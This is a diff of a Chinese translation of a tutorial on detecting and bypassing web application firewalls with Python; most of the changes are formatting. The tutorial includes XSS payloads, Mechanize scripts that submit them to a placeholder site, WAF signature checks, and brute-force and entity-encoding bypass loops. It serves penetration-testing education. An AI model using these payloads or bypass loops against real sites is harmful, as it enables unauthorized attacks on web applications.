@@ -1,12 +1,15 @@
----
-title: 使用Python检测和绕过WAF <译>
-date: 2017-06-24 23:58:15
-tags: [web, python, bypass, waf]
----
+# 使用Python检测和绕过WAF <译>
+
+![Category](https://img.shields.io/badge/category-bypass-blue.svg)
+![Research](https://img.shields.io/badge/research-web_security-blue.svg)
+![Language](https://img.shields.io/badge/lang-python-blue.svg)
+![Tag](https://img.shields.io/badge/tag-waf-green.svg)
+![Timestamp](https://img.shields.io/badge/timestamp-1498319895-lightgrey.svg)
+![Progress](https://img.shields.io/badge/progress-100%25-brightgreen.svg)
 
 <small>* 本文非完全直译，想了解作者原意，请直接阅读[<i class="fa fa-link"></i> 英文原文](http://www.kalitutorials.net/2016/12/python-detect-and-bypass-web-application-firewall.html)。</small>
 
-WAF（Web Application Firewall）通常被前置于Web服务器进行部署，用来过滤发送至后端Web服务器的恶意流量。
+WAF *（Web Application Firewall）* 通常被前置于Web服务器进行部署，用来过滤发送至后端Web服务器的恶意流量。
 
 > 当你在对目标进行渗透测试时，如果授权方忘记告诉你他们使用了WAF，那你可能会陷入到比较严重的困境之中。
 
@@ -14,9 +17,9 @@ WAF（Web Application Firewall）通常被前置于Web服务器进行部署，�
 
 ![web-applicaion-firewall-cyberpersons.gif](python-detect-and-bypass-web-application-firewall/web-applicaion-firewall-cyberpersons.gif)
 
-而目前，WAF更多是基于特征_（译者注：原文使用『signature based』一词，根据下文意思来看，就是常说的**基于正则匹配**）_来做的。
+而目前，WAF更多是基于特征 *（译者注：原文使用『signature based』一词，根据下文意思来看，就是常说的基于正则匹配）* 来做的。
 
-### 什么是基于特征的WAF？
+## 什么是基于特征的WAF？
 
 在基于特征的WAF中可以定义特征，就和你熟知的Web攻击相似的模式或特征一样，可以定义一堆的特征匹配模式来阻断这些恶意流量。
 
@@ -24,7 +27,7 @@ WAF（Web Application Firewall）通常被前置于Web服务器进行部署，�
 
 Payload: `<svg><script>alert&grave;1&grave;<p>`
 
-这是一种XSS攻击的payload模型，所有基于这种模型的攻击一般都会包含`<script>`字符串，因此可以定义一个特征来阻断所有包含该字符串的Web请求流量。那么，针对这种攻击模型，同样也可以衍生出如下2到3个特征定义：
+这是一种XSS攻击的Payload模型，所有基于这种模型的攻击一般都会包含`<script>`字符串，因此可以定义一个特征来阻断所有包含该字符串的Web请求流量。那么，针对这种攻击模型，同样也可以衍生出如下2到3个特征定义：
 
 1. `<script>`
 1. `alert(*)`
@@ -33,13 +36,13 @@ Payload: `<svg><script>alert&grave;1&grave;<p>`
 
 **这，就是基于特征的WAF的工作原理。**
 
-### 如何检测是否存在WAF？
+## 如何检测是否存在WAF？
 
-如文章开头所说，如果你正在进行渗透测试，而并不知道网络的另一端正有一个WAF在捣鬼，那么很可能会耗费你相当多的时间。因为大多数情况下，你的payload都会被WAF阻断，而无法判断到底它是否到达和作用于目标，导致你最终做出误判认为目标是安全的。
+如文章开头所说，如果你正在进行渗透测试，而并不知道网络的另一端正有一个WAF在捣鬼，那么很可能会耗费你相当多的时间。因为大多数情况下，你的Payload都会被WAF阻断，而无法判断到底它是否到达和作用于目标，导致你最终做出误判认为目标是安全的。
 
 因此，在开始你的渗透测试前，尝试检测目标是否存在WAF，是相当明智的选择。
 
-如今大多数WAF都会留下一些属于它们自己独特的痕迹。如果你使用上面的payload去尝试攻击，并收到了如下HTTP响应：
+如今大多数WAF都会留下一些属于它们自己独特的痕迹。如果你使用上面的Payload去尝试攻击，并收到了如下HTTP响应：
 
 ```http
 HTTP/1.1 406 Not Acceptable
@@ -54,11 +57,11 @@ Not Acceptable!Not Acceptable! An appropriate representation of the requested re
 
 > 这篇文章的主要内容就是告诉你如何编写一个简单的Python脚本来检测和绕过WAF。
 
-### 第一步：写一个漏洞
+## 第一步：写一个漏洞
 
-首先，需要写一个简单的模拟存在漏洞的Web应用程序_（别问为什么，除非你想喝茶）_。
+首先，需要写一个简单的模拟存在漏洞的Web应用程序 *（别问为什么，除非你想喝茶）* 。
 
-前端（HTML）：
+前端 *（HTML）* ：
 
 ```html
 <html>
@@ -71,7 +74,7 @@ Not Acceptable!Not Acceptable! An appropriate representation of the requested re
 </html>
 ```
 
-后端（PHP）：
+后端 *（PHP）* ：
 
 ```html
 <html>
@@ -81,9 +84,9 @@ Not Acceptable!Not Acceptable! An appropriate representation of the requested re
 </html>
 ```
 
-### 第二步：准备恶意请求
+## 第二步：准备恶意请求
 
-然后，构造一个包含XSS攻击payload的恶意请求。
+然后，构造一个包含XSS攻击Payload的恶意请求。
 
 这里使用了一个名为『Mechanize』的Python第三方模块，它可以模拟浏览器交互。
 
@@ -107,26 +110,26 @@ maliciousRequest.select_form(formName)
 1. 第一行，引入『Mechanize』模块，给它取了个小名叫『mec』
 1. 第二行，使用小『mec』创建一个『浏览器』实例
 1. 第三行，定义一个变量`formName`，把上面HTML中form表单的name属性值『waf』赋给它
-1. 第四行，打开指定的URL，就是你写的那个漏洞页面_（不用多说，这是个HTTP请求，需要提供正确的URL，本地的相对路径是肯定没戏的）_
+1. 第四行，打开指定的URL，就是你写的那个漏洞页面 *（不用多说，这是个HTTP请求，需要提供正确的URL，本地的相对路径是肯定没戏的）*
 1. 第五行，传入变量`formName`，告诉小『mec』在打开的页面中找到名为『waf』的表单
 
-可以将payload注入到这个表单唯一的input域中，观察由服务端回复的响应，来检测判断是否存在WAF。
+可以将Payload注入到这个表单唯一的input域中，观察由服务端回复的响应，来检测判断是否存在WAF。
 
-### 第三步：准备攻击Payload
+## 第三步：准备攻击Payload
 
-在input域『data』中填入准备好的攻击payload：
+在input域『data』中填入准备好的攻击Payload：
 
 ```python
 crossSiteScriptingPayLoad = "<svg><script>alert&grave;1&grave;<p>"
 maliciousRequest.form['data'] = crossSiteScriptingPayLoad
 ```
 
-1. 第一行，定义变量`crossSiteScriptingPayLoad`，存储攻击payload字符串
+1. 第一行，定义变量`crossSiteScriptingPayLoad`，存储攻击Payload字符串
 1. 第二行，将其填入form表单中的『data』域
 
 现在可以提交表单来分析响应了。
 
-### 第四步：提交表单
+## 第四步：提交表单
 
 提交表单，并输出响应内容：
 
@@ -147,11 +150,11 @@ print response
 </html>
 ```
 
-可以很直观的看到，响应内容直接输出了之前提交的payload。这就意味着，后端Web应用并没有过滤这段payload，也没有部署任何WAF来阻断这个恶意请求。
+可以很直观的看到，响应内容直接输出了之前提交的Payload。这就意味着，后端Web应用并没有过滤这段Payload，也没有部署任何WAF来阻断这个恶意请求。
 
 现在，万事俱备，只欠东风。
 
-### 第五步：检测是否存在WAF
+## 第五步：检测是否存在WAF
 
 变量`response`存储了服务器的响应内容，可以用它来简单检测下面几个WAF：
 
@@ -172,27 +175,27 @@ else:
     print "No Firewall Present"
 ```
 
-* 如果后端部署了Web Knight，响应内容中会包含『WebKnight』字符串
-* 如果后端使用了Mod Security，响应内容中会包含『Mod_Security』字符串
-* 如果后端部署了Dot Defender，响应内容中则会包含『dotDefender』字符串
+- 如果后端部署了Web Knight，响应内容中会包含『WebKnight』字符串
+- 如果后端使用了Mod Security，响应内容中会包含『Mod_Security』字符串
+- 如果后端部署了Dot Defender，响应内容中则会包含『dotDefender』字符串
 
-你可以收集更多其他的WAF特征，来扩展这个小脚本_（译者注：在检测逻辑中，最好能缩小待检测内容的范围，或者在最开始传入合适的URL，降低误报率）_。
+你可以收集更多其他的WAF特征，来扩展这个小脚本 *（译者注：在检测逻辑中，最好能缩小待检测内容的范围，或者在最开始传入合适的URL，降低误报率）* 。
 
-### 暴力绕过WAF
+## 暴力绕过WAF
 
-文章开头就提到过，目前大部分WAF都是基于特征来检测和阻断恶意请求的。但是各种语言和环境特性导致可被用于攻击的payload以及它们的变体成百上千，你可以把它们放在列表里，一个个尝试，记录每次请求的响应，看看是否可以绕过WAF。
+文章开头就提到过，目前大部分WAF都是基于特征来检测和阻断恶意请求的。但是各种语言和环境特性导致可被用于攻击的Payload以及它们的变体成百上千，你可以把它们放在列表里，一个个尝试，记录每次请求的响应，看看是否可以绕过WAF。
 
 上Python：
 
 ```python
 listofPayloads = ['<dialog open="" onclose="alert(1)"><form method="dialog"><button>Close me!</button></form></dialog>', '<svg><script>prompt&#40 1&#41<i>', '<a href="javascript:alert(1)">CLICK ME<a>']
-for payload in listofPayloads:
+for Payload in listofPayloads:
     maliciousRequest = mec.Browser()
     formName = 'waf'
 
     maliciousRequest.open("http://thisisafakewebsite.net/testWAF.html")
     maliciousRequest.select_form(formName)
-    maliciousRequest.form['data'] = payload
+    maliciousRequest.form['data'] = Payload
     maliciousRequest.submit()
 
     response = maliciousRequest.response().read()
@@ -208,8 +211,8 @@ for payload in listofPayloads:
 
 没见过的代码看这里：
 
-1. 第一行，定义了包含3个payload的列表
-1. 第二行，for循环，取出每个payload来尝试绕过
+1. 第一行，定义了包含3个Payload的列表
+1. 第二行，for循环，取出每个Payload来尝试绕过
 
 没有部署WAF的时候，程序的输出是这样的：
 
@@ -225,7 +228,7 @@ No Firewall Present
 No Firewall Present
 ```
 
-### 编码绕过WAF
+## 编码绕过WAF
 
 假设WAF会过滤HTML标签中的关键字符，如`<`和`>`，可以尝试使用Unicode或Hex实体编码替换，如果它们在输出时被转换为原始字符形态，就可以作为一个突破口继续尝试绕过。
 
@@ -276,14 +279,14 @@ for payLoads in listofPayloads:
 
 发现存在一个未被编码的标签，表示它被转换为了原始字符形态，这就是希望。
 
-### 结论
+## 结论
 
 这篇文章的目的是为了对你提前做一次安全普及，促使你提高自身的安全意识和能力，早黑客一步发现自己使用的WAF的弱点。
 
-因为现今大部分的人都只优先关心业务和产品，保证它们能够正常部署上线运行，而忽略了安全部分_（过度重视安全也是不好的，它往往和你的部分业务产品相悖，后期会成为一个让你十分头疼的问题）_。因此，具备自省自查的能力，能够自我主动的发现存在于自己网络基础设施中的安全威胁，始终个不错的选择。
+因为现今大部分的人都只优先关心业务和产品，保证它们能够正常部署上线运行，而忽略了安全部分 *（过度重视安全也是不好的，它往往和你的部分业务产品相悖，后期会成为一个让你十分头疼的问题）* 。因此，具备自省自查的能力，能够自我主动的发现存在于自己网络基础设施中的安全威胁，始终个不错的选择。
 
 <small>[<i class="fa fa-link"></i> 查看完整源代码](https://paste.ee/p/T9qb5)</small>
 
-### 说在最后的话
+## 说在最后的话
 
 这篇文章的作者所给出的代码只是为了向读者阐述他的观点和理论，抛砖引玉，相信你可以基于他的思路写出属于自己的WAF检测和绕过工具。
